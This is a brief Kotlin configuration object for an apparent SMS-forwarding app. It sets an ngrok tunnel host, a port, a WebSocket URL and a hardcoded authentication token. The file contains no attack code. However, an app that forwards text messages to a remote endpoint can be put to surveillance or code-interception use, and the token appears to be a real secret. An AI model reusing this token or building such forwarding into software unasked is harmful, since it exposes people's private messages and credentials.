package com.smsforwarder

/**
 * Configuration modifiable avant compilation.
 */
object Config {
    const val SERVER_IP = "8.tcp.ngrok.io"
    const val SERVER_PORT = 18477
    const val AUTH_TOKEN = "1X6zYLPLBE2xiSQETMEl0AFevPQ_3au6AvjmRow2HFgghcE4c"
    const val WEBSOCKET_URL = "ws://$SERVER_IP:$SERVER_PORT"
}
